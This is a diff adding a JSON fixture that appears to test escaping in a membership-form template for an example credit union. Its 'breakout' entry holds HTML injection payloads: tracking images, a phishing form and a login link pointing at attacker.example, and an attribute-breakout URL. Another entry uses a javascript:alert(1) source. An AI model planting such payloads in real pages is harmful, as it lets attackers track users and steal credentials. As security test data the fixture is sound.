@@ -1,0 +1,44 @@
+{
+  "breakout": {
+    "TITLE": "<img src=\"https://attacker.example/beacon.png\" alt=\"beacon\">",
+    "PURPOSE": "<form action=\"https://attacker.example/phish\"><input name=\"secret\"></form>",
+    "ACTION": "<a href=\"https://attacker.example/login\">Review your form</a>",
+    "ENTITY": "<img src=\"https://attacker.example/entity.png\" alt=\"entity\">",
+    "ENTITY_NAME": "<img src=\"https://attacker.example/entity-name.png\" alt=\"ename\">",
+    "VERTICAL": "<img src=\"https://attacker.example/vertical.png\" alt=\"vertical\">",
+    "SUB": "<img src=\"https://attacker.example/sub.png\" alt=\"sub\">",
+    "PAYMENT": "<img src=\"https://attacker.example/pay.png\" alt=\"pay\">",
+    "SIGNER": "<img src=\"https://attacker.example/signer.png\" alt=\"signer\">",
+    "PROC": "<img src=\"https://attacker.example/proc.png\" alt=\"proc\">",
+    "TIER": "<img src=\"https://attacker.example/tier.png\" alt=\"tier\">",
+    "SOURCE": "https://attacker.example/form.pdf\"><img src=\"https://attacker.example/pixel.png\" alt=\"pixel\">"
+  },
+  "https": {
+    "TITLE": "Plain Membership Form",
+    "PURPOSE": "Apply for a membership account",
+    "ACTION": "Signature Required",
+    "ENTITY": "Example Credit Union",
+    "ENTITY_NAME": "Example Credit Union",
+    "VERTICAL": "Financial Services",
+    "SUB": "Banking",
+    "PAYMENT": "0",
+    "SIGNER": "10",
+    "PROC": "2",
+    "TIER": "High",
+    "SOURCE": "https://forms.example/application.pdf"
+  },
+  "javascript": {
+    "TITLE": "Javascript Membership Form",
+    "PURPOSE": "Update a beneficiary designation",
+    "ACTION": "Disclosure (No Signature)",
+    "ENTITY": "Example Credit Union",
+    "ENTITY_NAME": "Example Credit Union",
+    "VERTICAL": "Financial Services",
+    "SUB": "Banking",
+    "PAYMENT": "0",
+    "SIGNER": "5",
+    "PROC": "1",
+    "TIER": "Medium",
+    "SOURCE": "javascript:alert(1)"
+  }
+}
